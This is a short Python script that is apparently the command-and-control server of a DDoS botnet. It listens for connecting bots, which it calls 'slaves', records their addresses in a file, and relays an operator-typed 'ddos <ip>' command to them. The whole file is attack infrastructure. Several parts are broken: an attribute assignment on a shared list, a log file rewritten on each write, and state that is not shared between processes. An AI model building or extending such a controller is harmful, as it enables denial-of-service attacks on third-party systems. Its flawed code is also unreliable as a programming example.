import socket
import ipaddress
from multiprocessing import Lock, Process, Manager

# COMMAND AND CONTROL CODE WILL GO HERE

port = 1234
ip = '127.0.0.1'

def runServer(sharedArray):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('127.0.0.1', port))
        print("Bound to " + ip + ":" + str(port))
        s.listen()
        print("Listening")
        while True:
                sres, addr = s.accept()
                data = sres.recv(1024)
                print("Received a message from " + str(addr) + ":\n"
                       + str(data))
                command = bytearray(sharedArray)
                sres.sendall(command)
                sres.close()
                if slaves.count(addr) == 0:
                    slaves.append(addr)
                    with open('slaves.txt', 'w') as file:
                        file.write(f"{addr}\n")
                        
def isValidIp(address):
    try:
        ip = ipaddress.ip_address(address)
        return True
    except ValueError:
        return False

slaves = list()

with open("slaves.txt", "r") as file:
    content = file.read()
    if(len(content.replace("\n", "")) > 0):
        slaves = content.split("\n")
        slaves = slaves[:-1]

if __name__ == "__main__":
    lock = Lock()
    manager = Manager()
    sharedArray = manager.list()
    sharedArray[:] = b""
    p = Process(target=runServer, args=(sharedArray,))
    p.start()
    while True:
        print("Enter a command...")
        command = input().strip()
        currentSplit = command.split(" ")
        if currentSplit[0] == "exit":
            print("Stopping server...")
            break
        elif currentSplit[0] == "ddos":
            if len(currentSplit) < 2 or not isValidIp(currentSplit[1]):
                print("Invalid argument, should give valid ip address")
                sharedArray.value = b""
            else:
                sharedArray[:] = command.encode('utf-8')
    p.kill()